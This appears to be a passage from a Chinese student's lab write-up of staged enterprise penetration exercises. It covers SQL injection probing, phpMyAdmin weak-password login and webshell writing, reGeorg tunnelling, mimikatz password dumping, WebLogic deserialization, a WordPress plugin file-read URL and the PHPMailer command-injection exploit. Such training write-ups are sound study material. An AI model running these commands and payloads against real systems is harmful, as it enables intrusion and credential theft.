<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161241037.png" alt="image-20200530161241037"></p>
<p>第二步：通过and 1=1、and 1=2 查看是否存在SQL注入漏洞</p>
<p>永真式1=1，失败</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161334967.png" alt="image-20200530161334967"></p>
<p>id=1 or 1成功，但是没什么用</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161329696.png" alt="image-20200530161329696"></p>
<p>第三步：order by 判断表段位数（也就是判断当前页面显示的内容，在数据库中是第几列内容)</p>
<p>遍历输入order by X，直到<code>order by 11</code>，页面显示不正常。可以判断现在只有10列内容</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161506093.png" alt="image-20200530161506093"></p>
<p>4.联合注入失败</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161729845.png" alt="image-20200530161729845"></p>
<p>多次尝试联合注入仍旧失败</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161927281.png" alt="image-20200530161927281"></p>
<p>查看<code>sql/index.php</code>我们可以知道其做了一堆过滤？</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530162102301.png" alt="image-20200530162102301"></p>
<p>2.利用SQL注入漏洞读取apache的配置文件，并通过配置文件中获取的网站根目录将一句话木马写入到网站目录中。</p>
<p>基于以上原因：php严格的过滤，使union等sql注入基本无法进行。我们使用后台上传一句话木马</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530160603628.png" alt="image-20200530160603628"></p>
<p>3.使用中国菜刀连接目标服务器上的一句话木马，查找网站根目录下文件中包含的flag值并提交</p>
<p>新建项，将一句话木马的url填写，在连接后面text框写一句话木马的参数，在配置里选好语言类型，点击添加。</p>
<p>双击连接</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530171416805.png" alt="image-20200530171416805"></p>
<p>在根目录下有本任务的flag</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530161208049.png" alt="image-20200530161208049"></p>
<p>打开<code>Thisisyourflag</code>即可</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530171559149.png" alt="image-20200530171559149"></p>
<h3 id="实验结果提交-1"><a href="#实验结果提交-1" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标网站根目录下的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag3{fd5d4d5a199e9e8bfadead5f5e52895a}</code></p>
<p>解密结果：gggda</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530160331470.png" alt="image-20200530160331470"></p>
<h2 id="任务三、phpmyadmin写shell"><a href="#任务三、phpmyadmin写shell" class="headerlink" title="任务三、phpmyadmin写shell"></a>任务三、phpmyadmin写shell</h2><h3 id="【任务描述】-2"><a href="#【任务描述】-2" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用之前扫描目录得到的结果访问到phpmyadmin的页面，利用弱口令登录到phpmyadmin服务中。
构造SQL语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell。</code></pre><p>通过完成本实验任务，要求学生掌握利用弱口令进入phpmyadmin。利用SQL语句进行信息获取并向目标服务器上写入一句话木马。掌握通过一句话木马和中国菜刀配合实现对SQL写文件漏洞利用技术的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-2"><a href="#实验目标-2" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
熟悉网站webshell的概念，理解上传webshell、获取webshell权限的意义和方法。
掌握webshell工具中国菜刀的基本使用，查看上传文件，命令执行等功能的使用。
掌握phpmyadmin的使用方法和渗透测试的过程。
掌握使用SQL语句进行读写文件的命令。</code></pre><h3 id="实验工具-2"><a href="#实验工具-2" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>wwwscan</li>
</ul>
<h3 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>尝试弱口令登录到phpmyadmin服务中
读取httpd的配置文件找到网站的根目录，然后尝试写入一句话木马，写入创建webshell的命令，使用中国菜刀连接一句话木马。
在网站数据库中发现有flag表，读取到flag并提交完成实验。</code></pre><p>1.尝试弱口令登录到phpmyadmin服务中</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530145920042.png" alt="image-20200530145920042"></p>
<p>启动扫描，扫描出了 <code>http://192.168.1.10:80/myadmin</code> ，猜测是 <code>phpmyadmin</code>（一个基于web的MySQL数据库管理工具。）</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530150313985.png" alt="image-20200530150313985"></p>
<p> <code>http://192.168.1.10:80/myadmin</code> 管理员登陆界面</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530150407650.png" alt="image-20200530150407650"></p>
<p>我们直接测试弱口令，如root ：root，admin：admin123，admin：123等等试一下，成功登陆</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530150500168.png" alt="image-20200530150500168"></p>
<p>2.读取httpd的配置文件找到网站的根目录，然后尝试写入一句话木马，写入创建webshell的命令，使用中国菜刀连接一句话木马。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530165954882.png" alt="image-20200530165954882"></p>
<p>已知general_log默认是关闭的，log日志存放的位置是C:\php\MySQL\data\SC-201805120002.log</p>
<p>开启generallog 的作用，开启它可以记录用户输入的每条命令，会把其保存在C:\php\MySQL\data\SC-201805120002.log下的一个log文件中，其实就是我们常说的日志文件。利用的思路是开启generallog之后把generallogfile的值修改为我们网站默认路径下一个自定义的php文件中，然后我们通过log日志进行写入一句话后门到上面去，然后再进一步利用。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530170610571.png" alt="image-20200530170610571"></p>
<p>3.在网站数据库中发现有flag表，读取到flag并提交完成实验。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530160204902.png" alt="image-20200530160204902"></p>
<h3 id="实验结果提交-2"><a href="#实验结果提交-2" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标网站数据库中的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag2{912ec803b2ce49e4a541068d495ab570}</code></p>
<p>解密结果：asdf</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530164137495.png" alt="image-20200530164137495"></p>
<h2 id="任务四、扫描PC端并登陆"><a href="#任务四、扫描PC端并登陆" class="headerlink" title="任务四、扫描PC端并登陆"></a>任务四、扫描PC端并登陆</h2><h3 id="【任务描述】-3"><a href="#【任务描述】-3" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用已经获取到权限的web机器，上传扫描脚本对内网中的其他主机进行扫描。
利用web代理工具代理访问内网的主机，使用之前数据库中获得的账号密码进行登录。</code></pre><p>通过完成本实验任务，要求学生掌握利用已经获取到权限的web机器运行脚本扫描内网。掌握通过web代理工具访问内网服务的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-3"><a href="#实验目标-3" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
熟悉网站webshell的概念，理解上传webshell、获取webshell权限的意义和方法。
掌握webshell工具中国菜刀的基本使用，查看上传文件，命令执行等功能的使用。
掌握regeorg代理工具和proxifier结合访问内网服务的方法。
掌握内网探测主机存活脚本的使用方法。</code></pre><h3 id="实验工具-3"><a href="#实验工具-3" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li><a href="https://www.freebuf.com/column/206524.html" target="_blank" rel="noopener">内网渗透–reGeorg+Proxifier</a></li>
<li><a href="https://blog.csdn.net/weixin_30244889/article/details/95245668" target="_blank" rel="noopener">RASscan内网端口极速扫描器</a></li>
<li>wwwscan</li>
</ul>
<p><strong>前言：</strong>在内网渗透中，由于防火墙的存在，导致我们无法对内网直接发起连接，因此就需要端口反弹，如果进一步对内网其他主机进行渗透，就需要通过内网的代理，才能对其他主机进行渗透。例如现在我们想要连接一台服务器的3389端口，却发现该端口只能内网连接，那么我们就可以使用这套组合（reGeorg+Proxifier）将我们的mstsc.exe的流量经过代理发现目标主机，这样就可以成功连接到对方的远程桌面了。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530191929414.png" alt="image-20200530191929414"></p>
<h3 id="操作步骤-3"><a href="#操作步骤-3" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>上传内网扫描的脚本到web的机器上，并对内网192.168.2.0/24段进行扫描
上传regeorg工具到web机器上开启代理服务
使用proxifier工具代理远程连接访问登录到192.168.2.11上
读取C盘上根目录下的文件中的flag字符串，提交后该实验任务完成。</code></pre><p><strong>1.</strong>上传内网扫描的脚本到web的机器上，并对内网192.168.2.0/24段进行扫描。</p>
<p>如之前的方法，上传RASscan.py、socks.py到服务器上</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530175158459.png" alt="image-20200530175158459"></p>
<p>在中国菜刀中打开终端</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530175254712.png" alt="image-20200530175254712"></p>
<p>然后启动扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令格式Python Rasscan.py 网络第一个ip 网络最后一个ip </span></span><br><span class="line">python2 RASscan.py 192.168.2.0 192.168.2.24 -t 20</span><br></pre></td></tr></table></figure>

<p>扫描出端口号是20</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530175501231.png" alt="image-20200530175501231"></p>
<p>内网端口扫描结果如下</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530175649016.png" alt="image-20200530175649016"></p>
<p><strong>2.</strong>上传regeorg工具到web机器上开启代理服务</p>
<p>新建一个文件夹，上传文件文件tunnel.nosocket.php到服务器上</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530180750776.png" alt="image-20200530180750776"></p>
<p>查看该服务</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530180714018.png" alt="image-20200530180714018"></p>
<p><strong>3.</strong>使用proxifier 工具代理远程连接访问登录到192.168.2.11上</p>
<p>博客：<a href="https://www.freebuf.com/column/206524.html" target="_blank" rel="noopener">内网渗透–reGeorg+Proxifier</a></p>
<p>在操作机的<code>Desktop\工具\reGeorg</code>打开工具使用 <code>reGeorgSocksProxy.py</code> 开启代理</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530181952960.png" alt="image-20200530181952960"></p>
<p>打开 <code>Proxifier</code>，新建连接</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530181501373.png" alt="image-20200530181501373"></p>
<p>然后设置规则：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530181453392.png" alt="image-20200530181453392"></p>
<p><code>mstc</code>远程登陆 192.168.2.11</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530182051893.png" alt="image-20200530182051893"></p>
<p>从之前的数据库中可以找到用户的密码：<code>topsec.123</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530182733041.png" alt="image-20200530182733041"></p>
<p>登陆Administrator账户，密码<code>topsec.123</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530182830475.png" alt="image-20200530182830475"></p>
<p><strong>4.</strong>读取C盘上根目录下的文件中的flag字符串，提交后该实验任务完成。</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530183107496.png" alt="image-20200530183107496"></p>
<p>flag如下</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530183118988.png" alt="image-20200530183118988"></p>
<h3 id="实验结果提交-3"><a href="#实验结果提交-3" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标192.168.2.11中C盘根目录下文件中的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag4{238fb735876083b832229d279b995062}</code></p>
<p>md5解密：<code>lkjhfdd</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530183207557.png" alt="image-20200530183207557"></p>
<h2 id="任务五、抓取域控密码并登陆域控"><a href="#任务五、抓取域控密码并登陆域控" class="headerlink" title="任务五、抓取域控密码并登陆域控"></a>任务五、抓取域控密码并登陆域控</h2><h3 id="【任务描述】-4"><a href="#【任务描述】-4" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用已经登录到远程桌面的机器，上传mimikatz工具抓取机器内存中的密码。
利用抓取到的密码登录到另一台机器192.168.2.10中。</code></pre><p>获取C盘根目录下flag.txt 中的文件内容，作为实验结果提交</p>
<p>通过完成本实验任务，要求学生掌握利用mimikatz抓取内存中账号密码的技术。掌握内网渗透抓取密码的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-4"><a href="#实验目标-4" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
掌握mimikatz的基本命令和使用方法
熟悉windows域的特性，抓取域控密码并登陆域控</code></pre><h3 id="实验工具-4"><a href="#实验工具-4" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>mimikatz</li>
<li><a href="https://www.cnblogs.com/Scholar-liu/p/11379950.html" target="_blank" rel="noopener">mimikatz使用方法——博客</a></li>
<li>mstsc</li>
</ul>
<h3 id="操作步骤-4"><a href="#操作步骤-4" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>使用mimikatz在之前远程桌面登陆的机器上抓取密码
使用抓取到的密码登录另一台机器192.168.2.10</code></pre><p>1.使用mimikatz在之前远程桌面登陆的机器上抓取密码</p>
<p>首先在192.168.2.11上，进入<code>网络/tsclient/c/用户/administator/桌面/工具</code> 拿到s原来操作机拿工具minikatz</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530184237632.png" alt="image-20200530184237632"></p>
<p><a href="https://www.cnblogs.com/Scholar-liu/p/11379950.html" target="_blank" rel="noopener">mimikatz使用方法——博客</a></p>
<p>以管理员身份运行mimikatz</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530184727395.png" alt="image-20200530184727395"></p>
<p>输入如下指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530184456226.png" alt="image-20200530184456226"></p>
<p>可以知道192.168.2.10的密码是<code>Simplexue123</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530185056596.png" alt="image-20200530185056596"></p>
<p>2.使用抓取到的密码登录另一台机器192.168.2.10</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530184618556.png" alt="image-20200530184618556"></p>
<p>在192.168.2.10的C盘根目录下存在flag.txt</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530185308803.png" alt="image-20200530185308803"></p>
<p>flag.txt内容如下</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530185440515.png" alt="image-20200530185440515"></p>
<h3 id="实验结果提交-4"><a href="#实验结果提交-4" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标192.168.2.11中C盘根目录下的文件中包含flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag5{6aa16f9b07f2d00b16b94aa797488b38}</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200530185914282.png" alt="image-20200530185914282"></p>
<h1 id="企业环境渗透二"><a href="#企业环境渗透二" class="headerlink" title="企业环境渗透二"></a>企业环境渗透二</h1><h2 id="任务一、Weblogic反序列化"><a href="#任务一、Weblogic反序列化" class="headerlink" title="任务一、Weblogic反序列化"></a>任务一、Weblogic反序列化</h2><h3 id="【任务描述】-5"><a href="#【任务描述】-5" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>整体扫描外部网络，探测暴露在外部的主机信息
利用java反序列化漏洞利用脚本执行系统命令。
在系统home目录下寻找flag字样的值提交，提交后该实验任务完成。</code></pre><p>通过完成本实验任务，要求学生掌握利用java反序列化漏洞利用脚本攻击weblogic服务的技术。掌握weblogic服务的常见端口，启动jar程序的方法和攻击weblogic的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-5"><a href="#实验目标-5" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
掌握java反序列化漏洞利用脚本的使用。
熟悉weblogic的常见端口。
掌握网络扫描探测的方法和技术原理和nmap的简单实用</code></pre><h3 id="实验工具-5"><a href="#实验工具-5" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>java反序列化漏洞利用工具</li>
<li>firefox</li>
<li>nmap</li>
</ul>
<h3 id="操作步骤-5"><a href="#操作步骤-5" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>浏览器访问192.168.2.10的7001端口
使用weblogic java反序列化利用工具获取权限
在home目录下查找flag字样字符串提交</code></pre><p>1.浏览器访问192.168.2.10的7001端口</p>
<p>访问之后发现404nofound了</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531100320352.png" alt="image-20200531100320352"></p>
<p>2.使用weblogic java反序列化利用工具获取权限</p>
<p>打开</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531100657414.png" alt="image-20200531100657414"></p>
<p>先点击connect，再输入下面的指令，execute</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531114239562.png" alt="image-20200531114239562"></p>
<p>3.在home目录下查找flag字样字符串提交</p>
<p>上面显示得flag是一个文件夹，真正的flag文件在其之中，如下执行得到flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /home/flag/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531101514660.png" alt="image-20200531101514660"></p>
<h3 id="实验结果提交-5"><a href="#实验结果提交-5" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交目标home目录下文件中的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag6{f67ed0564c9d4055130237cdde2ad486}</code></p>
<p>md5解密得：</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531101710798.png" alt="image-20200531101710798"></p>
<h2 id="任务二、Wordpress任意文件读取"><a href="#任务二、Wordpress任意文件读取" class="headerlink" title="任务二、Wordpress任意文件读取"></a>任务二、Wordpress任意文件读取</h2><h3 id="【任务描述】-6"><a href="#【任务描述】-6" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>使用wpscan工具扫描wordpress的插件漏洞
主要针对插件WP Hide Security Enhancer存在的任意文件读取漏洞，以此读取到网站主要文件。</code></pre><p>通过完成本实验任务，要求学生掌握wordpress插件的漏洞利用方法为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-6"><a href="#实验目标-6" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
掌握wordpress插件WP Hide Security Enhancer漏洞的利用方法。
掌握wpscan工具的使用和插件扫描命令</code></pre><h3 id="实验工具-6"><a href="#实验工具-6" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>firefox</li>
</ul>
<h3 id="操作步骤-6"><a href="#操作步骤-6" class="headerlink" title="操作步骤"></a>操作步骤</h3><p>1.利用wpscan扫描wordpress网站，扫描漏洞插件</p>
<blockquote>
<p>常用命令</p>
<p><a href="https://www.cokemine.com/wpscan-wp.html" target="_blank" rel="noopener">https://www.cokemine.com/wpscan-wp.html</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan –update //更新漏洞库 （已被墙）</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http:/testurl/  //扫描一些基本信息</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e //全面检测</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e p //扫描插件基本信息</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e vp //扫描易受攻击的插件</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e u //检测用户</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e tt //扫描timthumbs文件及漏洞</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e t //扫描主题</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url –wordlist [密码字典] –username [要破解的用户名称] –threads [开启的线程数] //暴力破解密码</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>插件可以说是 WordPress 最大的安全隐患了，特别是那些非 WordPress 官方插件库获取安装的插件（比如：破解版等）很容易存在漏洞和后门，使用 WPScan 扫描就可以获得这些信息。具体命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url 192.168.2.11 -e p</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531104133076.png" alt="image-20200531104133076"></p>
<p>通过上面拿到的插件漏洞（任意读取文件漏洞），我们可以读取wp-config.php的内容。</p>
<p>2.利用扫描出的插件漏洞读取wp-config.php的文件内容，获得flag字符串提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&amp;file_path=/wp-content/themes/enfold-child/style.css&amp;replacement_path=/wp-content/themes/enfold-child/style.css</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531105122376.png" alt="image-20200531105122376"></p>
<h3 id="实验结果提交-6"><a href="#实验结果提交-6" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交网站中wp-config.php中的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag4{358006170b5d31ff0523c1656df7b82e}</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531105201331.png" alt="image-20200531105201331"></p>
<h2 id="任务三、Wordpress命令执行"><a href="#任务三、Wordpress命令执行" class="headerlink" title="任务三、Wordpress命令执行"></a>任务三、Wordpress命令执行</h2><h3 id="【任务描述】-7"><a href="#【任务描述】-7" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>利用Burpsuite的repeater模块修改包探测漏洞存在的字段。
执行wordpress mailer命令执行漏洞的利用脚本尝试获取shell。</code></pre><p>本任务的目的是通过wordpress主系统本身的漏洞进一步渗透，任务二只是获得了文件读取的能力，而不能命令执行。经过进一步的探测，判断这个wordpress中存在phpmailer的命令执行漏洞，这个漏洞的特点是通过HTTP包中的Host字段触发，唯一的前提条件是需要知道管理员的用户名。</p>
<p>通过完成本实验任务，要求学生掌握浏览器配置代理的方法，利用Burpsuite抓包技术，使用Burpsuite的repeater模块测试漏洞存在的字段。掌握wordpress mailer命令执行漏洞的利用方法为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-7"><a href="#实验目标-7" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
掌握浏览器设置代理的方法
掌握Burpsuite抓包改包的基本操作和使用repeater模块探测漏洞字段。
掌握wordpress mailer漏洞的原理和脚本使用。</code></pre><h3 id="实验工具-7"><a href="#实验工具-7" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>Brupsuite</li>
<li>nmaps</li>
<li>wordpress mailer漏洞利用脚本</li>
</ul>
<h3 id="操作步骤-7"><a href="#操作步骤-7" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>访问目标网站，在浏览器中配置代理，用Burpsuite拦截请求包
使用Burpsuite的repeater模块探测漏洞字段。
理解wordpress mailer漏洞的原理，执行wp.sh脚本获取响应信息</code></pre><p>注：做完这个任务清空浏览器代理配置</p>
<blockquote>
<p><a href="https://www.cnblogs.com/lidong20179210/p/7828664.html" target="_blank" rel="noopener">repeater模块实现重放攻击</a></p>
<p><a href="https://www.cnblogs.com/ssooking/p/8893264.html" target="_blank" rel="noopener">WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)复现分析</a></p>
</blockquote>
<p>1.访问目标网站，在浏览器中配置代理，用Burpsuite拦截请求包。</p>
<p>漏洞页面：<code>/wp-login.php?action=lostpassword</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531114253819.png" alt="image-20200531114253819"></p>
<p>打开Burpsuite</p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531113819244.png" alt="image-20200531113819244"></p>
<p>在<code>/wp-login.php?action=lostpassword</code>页面上编辑，用户名admin，密码随意，提交</p>
<p>Burpsuite收到表单……</p>
<p>2.使用Burpsuite的repeater模块探测漏洞字段。</p>
<p>3.理解wordpress mailer漏洞的原理。</p>
<p><code>serverHostname</code>函数通过传入的<code>SERVER_NAME</code>参数来获取主机名，该主机名即HTTP请求报文中的host值，但是<code>SERVER_NAME</code>参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。</p>
<p>4.执行wp.sh脚本获取响应信息</p>
<p>执行 <code>wp.sh</code> 获取到flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./wp.sh http://192.168.2.11/</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531113209061.png" alt="image-20200531113209061"></p>
<h3 id="实验结果提交-7"><a href="#实验结果提交-7" class="headerlink" title="实验结果提交"></a>实验结果提交</h3><p>提交漏洞利用脚本攻击后的响应信息中包含的flag{32位MD5} 字样的字符串作为实验结果提交，提交后该实验任务完成。</p>
<p><code>flag3{452755af28285ffd6615866f61bb23e6}</code></p>
<p><img src="/2020/05/25/2020-05-25-Network-Security-Experiment-5/image-20200531111304954.png" alt="image-20200531111304954"></p>
<h2 id="任务四、通过改进漏洞利用脚本获得命令执行权限"><a href="#任务四、通过改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四、通过改进漏洞利用脚本获得命令执行权限"></a>任务四、通过改进漏洞利用脚本获得命令执行权限</h2><h3 id="【任务描述】-8"><a href="#【任务描述】-8" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p>
<pre><code>通过分析sendmail中的语法改进作者的漏洞利用脚本，缩短host字段的长度绕过限制。
利用改进后的漏洞利用脚本来获取shell。</code></pre><p>通过完成本实验任务，要求学生了解sendmail内置语法，了解漏洞利用脚本的改进原理。掌握利用bash反弹shell的操作，和通常利用命令执行漏洞的流程、方法和技巧，为完成后续企业渗透实验任务奠定坚实的漏洞利用技术基础。</p>
<h3 id="实验目标-8"><a href="#实验目标-8" class="headerlink" title="实验目标"></a>实验目标</h3><pre><code>了解网络安全漏洞的概念以及现有的安全漏洞扫描工具。认知常见网络安全漏洞。
熟悉sendmail命令语法。
掌握webshell命令执行漏洞的常规下载执行的利用思路。
掌握在浏览器上配置代理的方法。
掌握利用Burpsuite的repeater模块改包测试的过程。</code></pre><h3 id="实验工具-8"><a href="#实验工具-8" class="headerlink" title="实验工具"></a>实验工具</h3><ul>
<li>漏洞利用shell脚本</li>
</ul>
<h3 id="操作步骤-8"><a href="#操作步骤-8" class="headerlink" title="操作步骤"></a>操作步骤</h3><pre><code>查看漏洞利用脚本wordpress-rce-exploit.sh理解脚本改进的原理。
填写漏洞利用脚本的关键信息如反弹IP，监听端口等。本地监听设置的端口获取反弹的shell。
